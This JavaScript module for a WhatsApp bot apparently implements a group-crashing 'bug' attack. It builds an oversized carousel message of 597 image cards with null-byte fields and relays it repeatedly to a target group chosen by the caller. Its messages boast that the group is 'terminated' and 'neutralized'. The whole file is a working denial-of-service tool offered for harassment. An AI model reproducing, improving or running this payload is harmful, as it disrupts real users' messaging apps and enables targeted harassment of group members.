const fs = require('fs');
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

const sleep = (amt, type) => {
    return new Promise(resolve => setTimeout(resolve, type === 's' ? amt * 1000 : amt));
};

async function R9X(sura, groupId, mention) {
  var R9X1 = {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "WMATZulCqZloXFfBTYPzATm2v74jGJv7thxNE7C8X8o=",
    fileLength: 162903,
    height: 1080,
    width: 1080,
    mediaKey: "qR4aFXwJdZbH0Zgi7uxA5Y4to6eJjhKD2V5mhn/ZQrc=",
    fileEncSha256: "JDCO/kG+BT0CCdsRsdKSixsDleGaJNZPCJMVomLox3A=",
    directPath: "/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c",
    mediaKeyTimestamp: 1775033718,
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
    contextInfo: {
      pairedMediaType: "NOT_PAIRED_MEDIA"
    },
    scansSidecar: "2YCrK9uS0xGWeOGhQDDtgHrmdhks+9aRYU2v5pwgTYmXkWbuXBRpzg==",
    scanLengths: [
      10365,
      39303,
      40429,
      72806
    ],
    midQualityFileSha256: "lldAKS/9qixXmMdTvk0n/DUV7WJLwvT6BaZmOkbUDdE="
  };

  var cards = [];
  for (var r = 0; r < 597; r++) {
    cards.push({
      header: {
        imageMessage: R9X1,
        hasMediaAttachment: true
      },
      nativeFlowMessage: {
        messageParamsJson: "\0"
      }
    });
  }

  var R9X2 = await generateWAMessageFromContent(
    groupId,
    {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: { text: "\0" },
            carouselMessage: {
              cards: cards
            }
          }
        }
      }
    },
    {}
  );

  await sura.relayMessage(
    groupId,
    R9X2.message,
    mention ? { participant: groupId } : {}
  );
}

module.exports = {
    name: 'd-xgc',
    aliases: ['terminate', 'killgc', 'nukegc'],
    run: async (King, m, { args, prefix, command, reply, isCreator }) => {
        
        const sura = King;
        const from = m.chat;

        if (!isCreator) {
            return await sura.sendMessage(from, {
                text: "⚠️ *Access Denied:* Owner and premium users only."
            }, { quoted: m });
        }

        if (!args[0]) {
            return await sura.sendMessage(from, {
                text: `⚠️ *Usage:*\n${prefix}${command} <groupid> <amount>`
            }, { quoted: m });
        }

        const groupId = args[0].includes("@g.us") ? args[0] : args[0] + "@g.us";
        const amount = parseInt(args[1]) || 1;

        if (isNaN(amount) || amount < 1) {
            return sura.sendMessage(from, {
                text: "❌ *System Fault:* Invalid amount."
            }, { quoted: m });
        }

        try {
            await sura.groupMetadata(groupId);
        } catch {
            return sura.sendMessage(from, {
                text: "❌ *System Fault:* Invalid group ID or bot not inside group."
            }, { quoted: m });
        }

        const v3Warning = `☢️ *𝗕𝗥𝗔𝗜𝗡𝗪𝗔𝗩𝗘 𝗩𝟯 𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗘𝗗*\n\n┏━━|ϟ𓂂ʙᴜɢs sᴇɴᴛ𓂂ϟ|━━✧\n┃⧖ 𝚅𝙴𝚁𝚂𝙸𝙾𝙽ϟ ᴘʀᴇᴍɪᴜᴍ\n┃⧖ 𝚃𝙰𝚁𝙶𝙴𝚃ϟ ${groupId.split('@')[0]}\n┃⧖ 𝙰𝙼𝙾𝚄𝙽𝚃ϟ ${amount}\n┗━━━━━━━━★━━━━━━━◰\n\n> 𝗙𝗔𝗧𝗛𝗘𝗥 𝗢𝗙 𝗔𝗟𝗟 𝗛𝗔𝗧𝗘𝗥𝗦: 𝗦𝗛𝗔𝗛𝗭𝗔𝗜𝗕 𝗧𝗘𝗖𝗛`;

        if (fs.existsSync('./menu.jpg')) {
            await sura.sendMessage(from, { 
                image: fs.readFileSync('./menu.jpg'), 
                caption: v3Warning 
            }, { quoted: m });
        } else {
            await reply(v3Warning);
        }

        await King.sendMessage(from, { react: { text: '☠️', key: m.key } });

        for (let i = 0; i < amount; i++) {
            await R9X(sura, groupId, false);
            await sleep(3, "s");
            await R9X(sura, groupId, false);
        }

        await King.sendMessage(from, { react: { text: '☣️', key: m.key } });
        await sura.sendMessage(from, {
            text: "☣️ ＧＣ ＴＥＲＭＩＮＡＴＥＤ.\n_Target group has been successfully neutralized._\n\n> 𝗙𝗔𝗧𝗛𝗘𝗥 𝗢𝗙 𝗔𝗟𝗟 𝗛𝗔𝗧𝗘𝗥𝗦: 𝗦𝗛𝗔𝗛𝗭𝗔𝗜𝗕 𝗧𝗘𝗖𝗛"
        }, { quoted: m });
    }
}
